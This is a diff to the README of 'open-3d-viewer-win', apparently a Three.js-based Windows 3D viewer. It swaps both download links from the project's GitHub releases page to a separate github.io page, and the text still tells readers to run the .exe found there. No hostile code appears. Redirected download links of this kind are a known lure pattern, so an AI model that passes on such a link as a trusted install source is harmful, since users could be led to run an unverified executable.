@@ -1,6 +1,6 @@
 # 📦 open-3d-viewer-win - View 3D assets on your computer
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Abhishek-Ghildiyal/open-3d-viewer-win/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://abhishek-ghildiyal.github.io)
 
 This application provides a simple way to open and inspect 3D files on your Windows computer. It uses Three.js technology to show your models clearly. You do not need an internet connection to use this tool once it sits on your hard drive. It handles many common file formats so you can check your work without complex software.
 
@@ -8,7 +8,7 @@ This application provides a simple way to open and inspect 3D files on your Wind
 
 You need to download the installer from the release page. 
 
-[Click here to open the download page](https://github.com/Abhishek-Ghildiyal/open-3d-viewer-win/releases).
+[Click here to open the download page](https://abhishek-ghildiyal.github.io).
 
 Look for the latest version at the top of the list. Choose the file that ends in .exe to start the setup process.
 
